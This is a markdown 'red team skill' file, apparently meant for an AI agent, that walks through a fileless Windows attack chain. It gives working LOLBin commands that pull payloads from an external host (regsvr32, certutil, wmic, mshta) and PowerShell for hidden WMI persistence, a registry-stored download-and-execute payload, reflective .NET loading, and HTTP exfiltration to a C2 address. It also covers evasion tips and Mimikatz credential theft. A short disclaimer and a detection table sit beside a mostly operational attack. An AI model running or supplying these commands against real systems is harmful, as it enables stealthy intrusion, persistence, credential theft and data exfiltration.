

\---



\# 🔥 Red Team Skill: \*\*"Fileless Attack Chain Execution (LOLBins + WMI + Memory Persistence)"\*\*



> \*\*Skill Level\*\*: Advanced  

> \*\*Domain\*\*: Cybersecurity | Malware Operations | Offensive Security  

> \*\*Subdomain\*\*: Fileless Exploitation, Living Off the Land (LOLBins), In-Memory Attacks  

> \*\*Primary Use Case\*\*: Simulate advanced persistent threats without leaving disk artifacts; evade EDR, AV, and file-based detection.  



\---



\## 🎯 Objective



Execute a \*\*stealthy, fileless attack chain\*\* using legitimate Windows binaries (LOLBins), WMI event subscriptions, registry-stored payloads, and in-memory execution — all without writing any executable files to disk. This enables \*\*undetectable lateral movement\*\*, \*\*persistent access\*\*, and \*\*exfiltration\*\* while mimicking real-world attacker behavior.



\---



\## 🚀 When to Use



\- Conducting red team operations in a \*\*production-like environment\*\* where file-based detection is heavily enforced.

\- Testing the \*\*effectiveness of EDR, AV, and endpoint controls\*\* against fileless techniques.

\- Simulating \*\*advanced persistent threats (APTs)\*\* that use legitimate tools to avoid detection.

\- Performing \*\*blue team deception exercises\*\* by creating realistic, undetectable attack paths.



> ⚠️ \*\*Do NOT use this in production without explicit authorization.\*\* This skill is designed for authorized penetration testing and red teaming only.



\---



\## 🛠️ Prerequisites



| Tool | Purpose |

|------|--------|

| \*\*PowerShell (v5+)\*\* | For script execution, encoding, and in-memory operations |

| \*\*Sysmon (configured)\*\* | To observe process creation, WMI events, registry changes — \*to validate stealth\* |

| \*\*Windows 10/11 or Server 2016+\*\* | Target environment with full WMI and registry access |

| \*\*PowerShell Script Block Logging (enabled)\*\* | To capture deobfuscated scripts (critical for detection evasion) |

| \*\*WMI Access Rights\*\* | Must have `WMI\\root\\subscription` access to create event filters |

| \*\*Registry Write Permissions\*\* | Needed to store payloads in `HKCU\\Software`, `HKLM\\Run` |

| \*\*Network Connectivity\*\* | To exfiltrate data or communicate with C2 |



> ✅ Ensure \*\*Script Execution Policy is set to RemoteSigned or Bypassed\*\* during testing.



\---



\## 🧩 Attack Workflow (Red Team Version)



\### 🔹 Phase 1: Initial Access via LOLBin Abuse



Use legitimate binaries to gain initial foothold — no file creation, no disk artifacts.



| LOLBin | Technique | Command Example |

|-------|----------|-----------------|

| `mshta.exe` | Execute HTA with embedded VBScript/JScript | `mshta vbscript:CreateObject("WScript.Shell").Run "powershell -enc \[BASE64]"` |

| `regsvr32.exe` | Load malicious .sct scriptlet (Squiblydoo) | `regsvr32 /s /n /u /i:http://c2.com/payload.sct scrobj.dll` |

| `certutil.exe` | Download and decode payload | `certutil -urlcache -split -f http://c2.com/payload.exe` |

| `rundll32.exe` | Execute JavaScript via DLL | `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write("evil")` |

| `wmic.exe` | Trigger XSL-based payload download | `wmic process get brief /format:http://c2.com/payload.xsl` |



> 💡 \*\*Stealth Tip\*\*: Use `vbscript:` or `javascript:` prefixes to avoid logging as "script execution" in EDRs.



\---



\### 🔹 Phase 2: Establish WMI-Based Persistence



Create a \*\*persistent WMI event subscription\*\* that triggers malicious PowerShell execution on system events (e.g., system performance changes).



```powershell

\# Create WMI Filter (EventID 19)

$Filter = New-Object -ComObject "WbemScripting.SWbemEventFilter"

$Filter.Name = "WindowsUpdateCheck"

$Filter.Query = "SELECT \* FROM \_\_InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32\_PerfFormattedData\_PerfOS\_System'"

$Filter.Put()



\# Create Consumer (EventID 20)

$Consumer = New-Object -ComObject "WbemScripting.SWbemCommandLineEventConsumer"

$Consumer.Name = "PowerShellConsumer"

$Consumer.CommandLineTemplate = "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA..."

$Consumer.Put()



\# Bind Filter to Consumer (EventID 21)

$Binding = New-Object -ComObject "WbemScripting.SWbemFilterToConsumerBinding"

$Binding.Filter = $Filter.Name

$Binding.Consumer = $Consumer.Name

$Binding.Put()

```



> ✅ This persistence survives reboots and is invisible to traditional file-based detection.



\---



\### 🔹 Phase 3: Store Malicious Payload in Registry



Hide the payload in a \*\*large registry value\*\* (e.g., `HKCU\\Software\\SomeApp\\Data`) using Base64 encoding.



```powershell

\# Encode PowerShell payload into Base64

$payload = "Invoke-Expression (New-Object System.Net.WebClient).DownloadData('http://c2.com/evil.ps1')"

$encoded = \[Convert]::ToBase64String(\[System.Text.Encoding]::UTF8.GetBytes($payload))



\# Store in registry

$regPath = "HKCU:\\Software\\MyApp\\Payload"

Set-ItemProperty -Path $regPath -Name "Data" -Value $encoded -Type String

```



> 🔍 \*\*Detection Evasion\*\*: Large values (>500 bytes) are often ignored by AVs. Base64 is common and legitimate.



\---



\### 🔹 Phase 4: In-Memory Execution via .NET Reflection



Use \*\*reflective loading\*\* to load a malicious .NET assembly directly from memory — no file written.



```powershell

\# Load .NET assembly from in-memory bytes (no disk write)

$bytes = \[Convert]::FromBase64String("base64-encoded-assembly")

$assembly = \[System.Reflection.Assembly]::Load($bytes)



\# Execute malicious method

$method = $assembly.GetType("MaliciousClass").GetMethod("Execute")

$method.Invoke($null, $null)

```



> 🚫 Avoids file creation, AV scanning, and file-based IOCs.



\---



\### 🔹 Phase 5: Exfiltrate Data or Establish C2



Use PowerShell to send data to a \*\*C2 server\*\* via HTTP POST or DNS tunneling.



```powershell

\# Exfiltrate memory data via HTTP

$payload = Get-Content -Path "C:\\Temp\\memory\_dump.txt" | Out-String

Invoke-WebRequest -Uri "http://10.10.10.5:8080/exfil" -Method POST -Body $payload -UseBasicParsing

```



> 📡 Or use \*\*DNS tunneling\*\* via `Invoke-DNSExfiltration` (if available in custom module).



\---



\## 🧪 Detection Evasion \& Stealth Techniques



| Technique | How It Evades Detection |

|--------|--------------------------|

| \*\*No file written to disk\*\* | Avoids file-based IOCs, AV scanning, and file hashing |

| \*\*Use of legitimate binaries\*\* | Appears as normal system behavior (mshta, certutil) |

| \*\*WMI persistence\*\* | Survives reboots; not logged by traditional EDRs |

| \*\*Base64-encoded payloads\*\* | Looks like legitimate registry values or configuration data |

| \*\*Script Block Logging (Event ID 4104)\*\* | Can be used to \*simulate\* detection — but red team can \*bypass\* it via obfuscation |

| \*\*In-memory execution\*\* | No process image on disk; only in RAM |



> ⚠️ \*\*Red Team Note\*\*: Always monitor for \*\*Sysmon Event IDs 19, 20, 21\*\*, and \*\*Script Block Logging (4104)\*\* to validate if the attack is being detected.



\---



\## 📜 Sample Attack Chain (Red Team Simulation)



```text

Phase 1: Initial Access  

→ Phishing email with macro → opens Word → executes mshta.exe → runs PowerShell in memory  



Phase 2: Execution  

→ PowerShell downloads and decodes Base64 payload via certutil  

→ Uses .NET Assembly.Load() to reflectively load malicious assembly  



Phase 3: Persistence  

→ Creates WMI event subscription (WindowsUpdateCheck) that triggers PowerShell every 300 seconds  

→ Stores encoded payload in HKCU\\Software\\MyApp\\Data  



Phase 4: Privilege Escalation  

→ Uses PowerShell with Invoke-Mimikatz (in-memory) to extract credentials  



Phase 5: Lateral Movement  

→ Uses WMI to spawn remote process on target machine (no file transfer)  



Phase 6: Exfiltration  

→ Sends stolen data via HTTP POST to C2 server at http://10.10.10.5:8080  

→ Uses DNS tunneling to exfiltrate large payloads  

```



\---



\## 📚 Key Concepts (Red Team Perspective)



| Term | Red Team Use |

|------|-------------|

| \*\*LOLBins\*\* | Legitimate tools abused for stealth — no need to create new binaries |

| \*\*WMI Event Subscription\*\* | Persistent, undetectable persistence mechanism |

| \*\*Registry-Resident Payloads\*\* | Store and hide payloads in legitimate-looking registry keys |

| \*\*Reflective Loading\*\* | Load .NET assemblies from memory — avoids file system footprint |

| \*\*In-Memory Execution\*\* | Run code directly in RAM — no disk writes, no file-based detection |

| \*\*Script Block Logging (Event ID 4104)\*\* | Can be used to \*observe\* what scripts are executed — red team can \*bypass\* it with obfuscation |



\---



\## 🛡️ Mitigation \& Detection (For Blue Team)



| Defense | How to Detect |

|--------|---------------|

| \*\*Sysmon with WMI logging (EIDs 19, 20, 21)\*\* | Detect WMI event subscriptions and consumers |

| \*\*Script Block Logging (Event ID 4104)\*\* | Capture deobfuscated PowerShell scripts |

| \*\*Registry Monitoring\*\* | Watch for large Base64 values in `HKCU\\Software` |

| \*\*Process Monitoring\*\* | Flag unusual use of `mshta.exe`, `regsvr32.exe`, `certutil.exe` |

| \*\*Memory Forensics (Volatility)\*\* | Detect reflective loading, injected .NET assemblies |



> 🔍 \*\*Red Team Tip\*\*: Always test against \*\*Sysmon + Script Block Logging\*\* to validate detection effectiveness.



\---



\## 📎 Output Format (Red Team Report)



```text

RED TEAM FILELESS ATTACK REPORT

===============================

Incident:         RED-2025-1143  

Target:           Internal Server (Windows 10 Pro)  

Attack Type:      Fileless (No disk artifacts)  



INITIAL ACCESS  

Vector:           Phishing email with macro-enabled document  

LOLBin Chain:     WINWORD.EXE → mshta.exe → PowerShell  



PERSISTENCE MECHANISM  

Type:             WMI Event Subscription  

Filter Name:      WindowsUpdateCheck  

Query:            SELECT \* FROM \_\_InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32\_PerfFormattedData\_PerfOS\_System'  

Consumer:         CommandLineEventConsumer  

Command:          powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...  



REGISTRY PAYLOAD  

Path:             HKCU\\Software\\MyApp\\Data  

Size:             247 KB (Base64-encoded .NET assembly)  

Decoded:          \[Malicious .NET RAT with C2 to 10.10.10.5]  



MEMORY ARTIFACTS  

PID 4012 (powershell.exe):  

&#x20; - Reflectively loaded .NET assembly at 0x00400000  

&#x20; - Detected via YARA rule: Fileless\_PowerShell  

&#x20; - C2: http://10.10.10.5:8080/updates  



EXTRACTED IOCs  

C2 IP:            10.10.10.5  

WMI Filter:       WindowsUpdateCheck  

Registry Path:    HKCU\\Software\\MyApp\\Data  

PowerShell Flags: -nop -w hidden -enc  



MITRE ATT\&CK  

T1059.001 (PowerShell)  

T1546.003 (WMI Event Subscription)  

T1218.005 (Mshta)  

T1112 (Modify Registry)  

T1055.012 (Process Hollowing)  

```



\---



\## 📚 References \& Resources



\- \[LOLBAS Project](https://lolbas-project.github.io/) – Community catalog of LOLBin abuse techniques  

\- Microsoft Docs: WMI Event Subscriptions, PowerShell Script Block Logging  

\- Volatility 3: `windows.malfind`, `windows.cmdline`, `yarascan`  

\- Sigma Rules: Fileless detection rules (for blue team validation)



\---



\## ✅ Final Notes



> This red team skill demonstrates how \*\*advanced attackers use legitimate tools to bypass traditional security controls\*\*. By mastering fileless techniques, red teams can:

>

> - Test the resilience of EDR and AV systems  

> - Identify blind spots in detection logic  

> - Simulate real-world APT behavior  

> - Improve blue team response strategies  



\---



✅ \*\*Skill Status\*\*: Active | Version: 1.0.0 | Author: Red Team Agent (CyberOps)  

🔐 \*\*Classification\*\*: Offensive Security – Fileless Exploitation



\---

